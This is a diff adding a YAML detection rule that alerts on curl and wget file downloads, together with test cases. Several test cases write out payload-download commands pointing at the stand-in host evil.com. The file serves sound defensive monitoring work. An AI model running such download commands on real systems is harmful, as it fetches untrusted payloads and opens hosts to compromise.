@@ -1,0 +1,32 @@
+name: curl_wget_download
+mode: alert
+eval: |
+  (
+    (e.process_name == "curl" && re_match(e.process_args, "(-o\\s|--output\\s|-O|--remote-name)")) ||
+    (e.process_name == "wget" && re_match(e.process_args, "(https?://|ftp://)"))
+  )
+tests:
+  - cleartext: "curl -o /tmp/payload http://evil.com/mal"
+    process_name: curl
+    process_args: "curl -o /tmp/payload http://evil.com/mal"
+    should_match: true
+  - cleartext: "curl --output /tmp/payload http://evil.com/mal"
+    process_name: curl
+    process_args: "curl --output /tmp/payload http://evil.com/mal"
+    should_match: true
+  - cleartext: "curl -O http://evil.com/malware.bin"
+    process_name: curl
+    process_args: "curl -O http://evil.com/malware.bin"
+    should_match: true
+  - cleartext: "wget http://evil.com/malware -O /tmp/mal"
+    process_name: wget
+    process_args: "wget http://evil.com/malware -O /tmp/mal"
+    should_match: true
+  - cleartext: "wget ftp://mirror.example.com/file.tar.gz"
+    process_name: wget
+    process_args: "wget ftp://mirror.example.com/file.tar.gz"
+    should_match: true
+  - cleartext: "curl -s http://api.example.com/health"
+    process_name: curl
+    process_args: "curl -s http://api.example.com/health"
+    should_match: false
